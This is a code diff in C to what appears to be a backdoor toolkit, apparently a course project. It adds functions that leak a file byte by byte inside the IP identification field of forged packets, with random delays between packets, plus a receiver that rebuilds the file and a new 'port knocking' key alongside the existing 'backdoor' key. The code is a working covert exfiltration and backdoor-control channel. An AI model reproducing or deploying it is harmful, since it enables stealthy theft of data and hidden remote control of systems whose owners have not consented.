@@ -18,6 +18,73 @@
 #include <stdlib.h>
 #include "covert_wrappers.h"
 
+void recv_results(char* sip, unsigned short sport, char* filename) {
+    FILE* file;
+    char input;
+
+    printf("listening for results\n\n");
+
+    if((file = fopen(filename, "wb")) == NULL) {
+        perror("fopen can't open file");
+        exit(1);
+    }
+
+    while(1) {
+        input = covert_recv(sip, sport, 1, 0, 0, 0);
+        if(input > 0) {
+            printf("Output(%d): %c\n", input, input);
+            fprintf(file, "%c", input);
+            fflush(file);
+        } else if (input == -1){
+            printf("Covert Receive Complete\n");
+            return;
+        }
+    }
+}
+
+void send_results(char *sip, char *dip, unsigned short sport, unsigned short dport, char *filename) {
+    FILE *file;
+    char input;
+    clock_t start;
+    int timer_complete =0, delay  = 0;
+    int max_delay = 1;
+    double passed;
+
+    if((file = fopen(filename, "rb")) == NULL) {
+        perror("fopen can't open file");
+        exit(1);
+    }
+
+    while((input = fgetc(file)) != EOF) {
+        printf("Character to send: %d\n", input);
+        covert_send(sip, dip, sport, dport, (unsigned char *) &input, 1); //send the packet
+        start = clock();    //start of clock
+        timer_complete = 0;    //reset the timer again
+        delay = rand_delay(max_delay);
+        printf("delay: %d\n", delay);
+
+        //wait for the timer to complete
+        while(timer_complete == 0) {
+            passed = (clock() - start) / CLOCKS_PER_SEC;
+            if(passed >= delay) {
+                printf("Delay completed\n");
+                timer_complete = 1;
+            }
+        }
+    }
+
+    input = 4;  //send EOT (end of transmission) character
+    covert_send(sip, dip, sport, dport, (unsigned char*) &input, 1); //send the packet
+
+    printf("completed\n");
+    fclose(file);
+}
+
+
+int rand_delay(int delay) {
+    return rand() % delay + 1;
+}
+
 void covert_send(char *sip, char *dip, unsigned short sport, unsigned short dport, unsigned char* data, int covert_channel) {
     int bytes_sent;
     int sending_socket;
@@ -42,7 +109,11 @@ void covert_send(char *sip, char *dip, unsigned short sport, unsigned short dpor
         packet.ip.id = data[0];
         printf("sending: %c\n", data[0]);
         packet.ip.tos = 0;
-    } else {
+    }else if(covert_channel == 2){
+        //key for port knocking
+        packet.ip.id = 'l';  //enter a single ASCII character into the field
+        packet.ip.tos = 'b';
+    }else {
         //key for backdoor
         packet.ip.id = 'b';  //enter a single ASCII character into the field
         packet.ip.tos = 'l';
@@ -134,6 +205,13 @@ char covert_recv(char *sip, unsigned short sport, int ipid, int seq, int ack, in
     }
 
     bytes_recv = read(recv_socket, (struct recv_tcp *)&recv_tcp, 9999);
+
+    //check if we received an EOT (end of transmission) char or normal char
+    if(recv_tcp.ip.id == 4) {
+        return -1;
+    } else {
+        return recv_tcp.ip.id;
+    }
 
     if(sport == 0) {    //from any port
         if((recv_tcp.tcp.syn == 1) && (recv_tcp.ip.saddr == sip_binary)) {
